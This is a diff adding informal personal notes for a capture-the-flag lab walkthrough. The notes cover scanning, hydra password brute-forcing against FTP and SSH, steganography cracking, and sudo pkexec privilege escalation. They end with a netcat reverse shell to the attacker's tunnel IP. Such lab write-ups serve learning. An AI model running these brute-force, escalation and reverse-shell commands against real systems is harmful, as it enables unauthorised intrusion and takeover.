@@ -1,0 +1,92 @@
+first run nmap nmap -sC -sV -vv -p- 10.10.28.113
+try anonymous on ftp server
+	didnt work, darn next step
+lets look at the webpage 
+	no metadata in there
+lets try a gobuster (tried with and without arguments for both big and medium directory buster)
+	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirb/big.txt -x http,php,txt,zip
+	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x http,php,txt,zip
+	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	gobuster dir -u 10.10.28.113 -w /usr/share/wordlists/dirb/big.txt
+in the first one that we did we see that we have a hidden directory
+	/island
+	we can see the code word is...
+		highlight the whole page, or inspect the page and you will find the code word
+			vigilante
+		lets try to use vigilante as the username for ftp and also for an ssh hydra attack
+			hydra -l vigilante -P /usr/share/wordlists/rockyou.txt 10.10.28.113 ftp
+			hydra -l vigilante -P /usr/share/wordlists/rockyou.txt 10.10.28.113 ssh
+	lets also try a gobuster with /island
+		gobuster dir -u 10.10.28.113/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+		we now find a sub directory with 2100
+	http://10.10.28.113/island/2100/
+	lets inspect element, you can avail your .ticket here but how?
+		lets add a .ticket to the end of the web address (that didnt work)
+so far gobuster has worked, lets try another one on the 2100 site and remember the .ticket
+	gobuster dir -u 10.10.28.113/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
+		as we can see ticket was used at the end as an arugment, this is because of how it was written
+			we get a /green_arrow.ticket
+			now we have a hash to crack (base 58 hash)
+				password is !#th3h00d
+		now lets try to get in to the ftp server
+			username: vigilante
+			password: !#th3h00d
+				we got in
+		ls -la shows us a couple of pictures, we have aa.jpg, leave me alone and queens gambit
+			get *.png
+			get aa.jpg
+		now copy all of those to the desktop to view them
+		lets go back to the ftp site, we can do a cd .. and start to see what we can find
+			we find two different folders, lets go into slade
+				we cant...
+			but we can get into vigilante
+When we look at the desktop it looks like one of the png files is incorrect, the leave me alone one
+	first lets see if we can do anything with the other files
+		steghide extract -sf aa.jpg (this does not work becuase we need a password and !#th3h00d is not it)
+	Lets look at the leave me alone file which is a .png next to the queens gambit file, also a .png
+		using a hexeditor we can see that the leave me alone is not a png, while queens gambit is a png (look at
+		the first header
+	After this we can see the password is password
+		we could have found the password another way though, using stegcracker which can be downloaded from 
+		github
+			stegcracker /home/kali/Desktop/aa.jpg /usr/share/wordlists/rockyou.txt 
+StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2020 - Luke Paris (Paradoxis)
+
+Counting lines in wordlist..
+Attacking file '/home/kali/Desktop/aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
+Successfully cracked file with password: password
+Tried 4 passwords
+Your file has been written to: /home/kali/Desktop/aa.jpg.out
+password
+
+Now we can do a steghide and see that it extracted a password text file with a username
+	steghide extract -sf  aa.jpg 
+Enter passphrase: 
+wrote extracted data to "ss.zip".
+kali@kali:~$ unzip ss.zip 
+Archive:  ss.zip
+  inflating: passwd.txt              
+  inflating: shado            
+lets do a cat passwd.txt
+cat shado
+	looks like we have a password, M3tahuman
+we are in again, lets do an ls -la
+	there is a user.txt file in here
+we have a flag
+	we try to move to root and the only thing we can do is a /usr/bin/pkexec
+		WTF IS PKEXEC!!!
+	allows for unauthorized users to run a program as another user
+		i'll be damned, lets just run root as root then from slade
+			sudo /usr/bin/pkexec ls /root/
+			sudo /usr/bin/pkexec cat /root/root.txt
+				we find another flag
+WE ARE DONE, but you shouldnt feel like you are done, we have done too much so far to just be done with this
+	lets make ourselves a root and never have to use pkexec again!!!
+		first sudo ifconfig and get yoru tunnel ip address
+		make a listening port
+		make slades ass go  to your port on your tunnel!!! and do a damn reverse_tcp lookup
+		sudo /usr/bin/pkexec /bin/nc 10.6.23.228 9999 -e /bin/sh
+			now on your kali terminal you should be able to make changes and show that you are root
+			
+
